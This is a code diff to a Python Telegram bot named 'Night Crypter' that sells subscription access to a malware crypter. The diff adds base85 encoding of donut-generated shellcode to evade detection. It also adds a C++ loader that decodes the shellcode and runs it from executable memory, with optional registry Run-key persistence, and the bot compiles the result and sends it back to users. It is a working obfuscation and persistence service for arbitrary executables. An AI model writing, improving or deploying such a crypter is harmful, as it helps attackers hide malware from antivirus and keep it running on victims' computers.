@@ -8,7 +8,7 @@ import donut
 import warnings
 from telegram.warnings import PTBUserWarning
 import pytz
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
 from telegram.ext import (
     Application,
     CommandHandler,
@@ -197,6 +197,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply_markup=reply)
 
+async def edit_message(query: CallbackQuery, text: str, reply_markup: InlineKeyboardMarkup):
+    """Edits a message, handling both text and photo-with-caption messages."""
+    if query.message and query.message.photo:
+        await query.edit_message_caption(caption=text, reply_markup=reply_markup)
+    else:
+        await query.edit_message_text(text=text, reply_markup=reply_markup)
+
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     if query is None:
@@ -208,7 +215,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     users = load_json(USERS_FILE)
     user = users.get(uid)
     if not user:
-        await query.edit_message_text("Record not found. Please send /start.")
+        await edit_message(query, "Record not found. Please send /start.", None)
         return
 
     if data == "profile":
@@ -223,13 +230,13 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"⭐ Subscription: {a_disp}\n\n"
             f"🔁 Daily Crypt: {daily_used}/{daily_limit}\n"
         )
-        await query.edit_message_text(text, reply_markup=reply)
+        await edit_message(query, text, reply)
 
     elif data == "plans":
         keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
         reply = InlineKeyboardMarkup(keyboard)
         text = "Contact the admin to purchase a subscription."
-        await query.edit_message_text(text, reply_markup=reply)
+        await edit_message(query, text, reply)
 
     elif data == "crypter":
         if has_active_subscription(query.from_user.id):
@@ -239,7 +246,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
         reply = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text, reply_markup=reply)
+        await edit_message(query, text, reply)
 
     elif data == "back":
         keyboard = [
@@ -248,7 +255,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("Crypter", callback_data="crypter")]
         ]
         reply = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text("🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply_markup=reply)
+        await edit_message(query, "🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply)
 
 # ---------- Admin and User Commands ----------
 async def grant_a_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -334,8 +341,10 @@ async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     return GET_FILENAME
 
+import base64
+
 async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the desired filename and asks about startup."""
+    """Stores the desired filename and asks about startup persistence."""
     filename = update.message.text
     if not filename.lower().endswith('.exe'):
         filename += '.exe'
@@ -358,7 +367,7 @@ async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     return GET_STARTUP_CHOICE
 
 async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the startup choice, compiles, sends, cleans up, and ends."""
+    """Stores startup choice, compiles with Base85 and startup macro, sends, and cleans."""
     query = update.callback_query
     await query.answer()
 
@@ -368,34 +377,60 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
     output_filename = context.user_data.get('output_filename')
 
     if not input_path or not output_filename:
-        await query.edit_message_text("Error: Missing data. Please start over by sending the file again.")
+        await edit_message(query, "Error: Missing data. Please start over.", None)
         context.user_data.clear()
         return ConversationHandler.END
 
     uid = query.from_user.id
     udir = user_stub_dir(uid)
-    # Use a unique name for the cpp file
     cpp_file_path = os.path.join(udir, f"source_{uid}.cpp")
     compiled_exe_path = os.path.join(udir, f"compiled_{uid}.exe")
 
     try:
-        await query.edit_message_text("Processing your file... This may take a moment.")
+        await edit_message(query, "Processing your file... This may take a moment.", None)
 
         shellcode_bytes = donut.create(file=input_path)
-        shellcode_formatted = ', '.join([f'0x{b:02x}' for b in shellcode_bytes])
-
+        encoded_shellcode = base64.b85encode(shellcode_bytes).decode('ascii')
         app_name_for_registry = os.path.splitext(output_filename)[0]
 
-        # Conditionally create the line of C++ for the startup functionality
-        startup_line = ""
-        if startup:
-            # Note: The C++ string literal for the registry key requires double backslashes
-            # The app name needs to be in escaped quotes
-            startup_line = f'char currentPath[MAX_PATH]; GetModuleFileName(NULL, currentPath, MAX_PATH); addToStartup(\\"{app_name_for_registry}\\", currentPath);'
+        startup_macro = "#define StartUP true" if startup else "#define StartUP false"
 
         cpp_template = f'''
 #include <windows.h>
 #include <string.h>
+#include <vector>
+#include <string>
+
+{startup_macro}
+
+// Function to decode a base85 string into a vector of bytes
+std::vector<unsigned char> b85_decode(const std::string& b85_string) {{
+    std::vector<unsigned char> decoded_data;
+    unsigned int buffer = 0;
+    int count = 0;
+
+    for (char c : b85_string) {{
+        if (c < '!' || c > 'u') continue;
+        buffer = buffer * 85 + (c - 33);
+        count++;
+        if (count == 5) {{
+            decoded_data.push_back(buffer >> 24);
+            decoded_data.push_back(buffer >> 16);
+            decoded_data.push_back(buffer >> 8);
+            decoded_data.push_back(buffer);
+            buffer = 0;
+            count = 0;
+        }}
+    }}
+
+    if (count > 0) {{
+        for (int i = count; i < 5; i++) buffer = buffer * 85 + 84;
+        for (int i = 0; i < count - 1; i++) {{
+            decoded_data.push_back((buffer >> (24 - i * 8)) & 0xFF);
+        }}
+    }}
+    return decoded_data;
+}}
 
 void addToStartup(const char* appName, const char* appPath) {{
     HKEY hKey;
@@ -406,16 +441,21 @@ void addToStartup(const char* appName, const char* appPath) {{
     }}
 }}
 
-unsigned char shellcode[] = {{
-  {shellcode_formatted}
-}};
+const std::string b85_shellcode = "{encoded_shellcode}";
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
-    {startup_line}
+#if StartUP
+    char currentPath[MAX_PATH];
+    GetModuleFileName(NULL, currentPath, MAX_PATH);
+    addToStartup("{app_name_for_registry}", currentPath);
+#endif
 
-    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    std::vector<unsigned char> shellcode = b85_decode(b85_shellcode);
+    if (shellcode.empty()) return 1;
+
+    void* exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (exec != NULL) {{
-        memcpy(exec, shellcode, sizeof(shellcode));
+        memcpy(exec, shellcode.data(), shellcode.size());
         ((void(*)())exec)();
     }}
     return 0;
@@ -426,30 +466,36 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
         compile_result = subprocess.run(
             ["g++", cpp_file_path, "-o", compiled_exe_path, "-mwindows"],
-            capture_output=True, text=True
+            capture_output=True, text=True,
         )
 
         if compile_result.returncode != 0:
-            await query.edit_message_text(f"Compilation error:\\n{compile_result.stderr}")
+            error_msg = f"Compilation Error:\\n{compile_result.stderr}"
+            print(f"Compilation failed for user {uid}:\\n{error_msg}")
+
+            # Truncate for Telegram
+            if len(error_msg) > 4000:
+                error_msg = error_msg[:4000] + "\\n...(truncated)"
+
+            await edit_message(query, error_msg, None)
             return ConversationHandler.END
 
         with open(compiled_exe_path, "rb") as f:
             await context.bot.send_document(chat_id=uid, document=f, filename=output_filename)
 
-        # Increment the user's daily count now that the process is successful
         increment_crypt_count(uid)
-
-        await query.edit_message_text("✅ File created and sent successfully.")
+        await edit_message(query, "✅ File created and sent successfully.", None)
 
     except Exception as e:
-        print(f"File processing error: {e}")
-        await query.edit_message_text(f"An error occurred while processing your file: {e}")
+        import traceback
+        print(f"An exception occurred for user {uid}:")
+        traceback.print_exc()
+        await edit_message(query, f"An unexpected error occurred: {e}", None)
 
     finally:
         for path in [input_path, cpp_file_path, compiled_exe_path]:
             if path and os.path.exists(path):
                 os.remove(path)
-
         context.user_data.clear()
 
     return ConversationHandler.END
@@ -457,7 +503,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Cancels and ends the conversation."""
     await update.message.reply_text("Operation cancelled.")
-    # Cleanup any lingering data
     input_path = context.user_data.get('input_path')
     if input_path and os.path.exists(input_path):
         os.remove(input_path)
@@ -476,7 +521,6 @@ def main():
 
     app = Application.builder().token(TOKEN).build()
 
-    # Schedule the daily reset job
     job_queue = app.job_queue
     reset_time = time(hour=0, minute=0, second=0, tzinfo=tzinfo)
     job_queue.run_daily(reset_all_daily_used, time=reset_time, name="daily_reset_job")
